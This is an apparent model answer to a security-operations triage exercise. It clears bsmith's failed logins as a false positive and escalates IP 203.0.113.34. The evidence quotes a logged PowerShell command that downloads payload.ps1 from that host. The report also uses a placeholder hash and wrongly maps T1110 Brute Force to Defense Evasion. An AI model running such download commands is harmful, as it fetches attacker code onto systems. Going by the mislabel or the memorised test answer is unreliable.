## Investigation Report (Answer)

### 1. Verdict

#### **Verdict: False Positive (Benign Activity) — with Escalation Note on Source Infrastructure**

**Justification:** The failed login attempts against user **bsmith** on **SERVER-01** are confirmed legitimate — internal identity records verify the user was traveling and eventually authenticated successfully. The alert, as scoped (bsmith's authentication activity), is closed as a **False Positive**. However, correlated threat-hunting telemetry shows the same source IP independently hosting and serving a malicious PowerShell payload elsewhere in the environment. This is flagged separately below and does **not** change the verdict on bsmith's login activity, but warrants formal escalation for deeper investigation into the IP itself.

---

### 2. In-Depth Analysis and Conclusion

The SIEM generated an alert after detecting multiple failed authentication attempts against **SERVER-01** from external IP **203.0.113.34**, targeting user account **bsmith**. Based on authentication telemetry alone, this pattern resembled a brute-force attempt and was mapped to **T1110 – Brute Force** under **TA0005 – Defense Evasion**.

Failed logins alone are not sufficient to confirm malicious intent — they can result from incorrect passwords, VPN/synchronization issues, or legitimate users authenticating from unfamiliar locations. Internal identity records confirmed that **bsmith was legitimately traveling** at the time of the alert, and that the failed attempts preceded a successful login by the same user. **AbuseIPDB** returned a clean reputation for the source IP at the time of lookup. Taken together, the login activity itself is assessed as **benign, non-malicious behavior** and the alert as scoped is a **False Positive**.

**However, this investigation did not stop at the reputation lookup.** Threat-hunting telemetry pulled during the investigation surfaced the following, all tied to the **same source IP (203.0.113.34)**:

- A **Sysmon Event ID 1** (11/07/2026, 05:03:21 UTC) recording `Invoke-WebRequest -Uri http://203.0.113.34/payload.ps1`, executed under **CORP\admin** on a host with parent process `cmd.exe`.
- A **CrowdStrike Falcon** alert (11/07/2026, 08:27:51 UTC) on **win-srv-01** — "Suspicious PowerShell Download," Severity=High — flagging a process with a matching SHA256 (`A1B2C3D4E5F6`) and killing it.
- A **firewall log** (11/07/2026, 01:47:53 UTC) showing 203.0.113.34 attempting an inbound connection to a separate internal host (**192.168.1.10:443**), denied by the perimeter firewall.

This is a materially different finding than a routine dismissal of unrelated noise (as with the firewall log in `critical/001`): here, the **exact IP** that generated bsmith's failed logins is independently confirmed, via internal EDR/Sysmon telemetry, to be actively hosting a malicious payload and probing at least one other internal host. A clean AbuseIPDB score reflects public reputation feeds, which commonly lag behind newly-weaponized or dual-use infrastructure (e.g., compromised VPS, residential proxy, or shared exit node), and should not be treated as authoritative when internal telemetry shows contradicting evidence.

**Scope discipline:** The scope of this specific alert is bsmith's authentication activity on SERVER-01, and that activity is confirmed benign — the verdict on the alert as filed does not change. But the IP itself is now a substantiated indicator of compromise elsewhere in the environment, and closing this case without formally routing that finding onward would let a confirmed malicious-infrastructure indicator go un-investigated. A separate note (`jdoe`, risk_score 85, flagged Moscow login) appearing in the identity tool output belongs to a different user and is out of scope for this case; it is not addressed here and should be triaged independently if not already covered elsewhere.

#### Conclusion

The alert, as filed, is a confirmed **False Positive** — bsmith's login activity was legitimate travel-related authentication with no compromise. The case is closed on that basis. Separately, source IP **203.0.113.34** is escalated for Tier 2/Tier 3 review, given confirmed internal evidence (Sysmon + CrowdStrike) that it served a malicious payload and probed an internal host, independent of and prior to its use against bsmith's account.

#### Escalation Note (for L2/L3 Analyst)

> **Indicator:** 203.0.113.34
> **Why escalated:** This IP generated the failed logins investigated in this case (confirmed benign — legitimate user travel). However, correlated Sysmon and CrowdStrike telemetry from the same 24–48 hour window show this **same IP** was used to serve a malicious PowerShell payload (`payload.ps1`, SHA256=A1B2C3D4E5F6) executed on **win-srv-01** under **CORP\admin**, and separately attempted an inbound connection to **192.168.1.10**, denied at the firewall.
> **Requested action:** Determine whether 203.0.113.34 is compromised infrastructure, a shared/dynamic-use IP (e.g., VPS, proxy, NAT egress), or dedicated attacker infrastructure. Confirm scope of activity on **win-srv-01** (full compromise vs. contained/killed process), verify whether the account **CORP\admin** was itself compromised or misused, and assess whether 192.168.1.10 requires proactive review despite the connection being denied. Recommend adding 203.0.113.34 to the perimeter blocklist pending outcome, independent of its clean public reputation score.
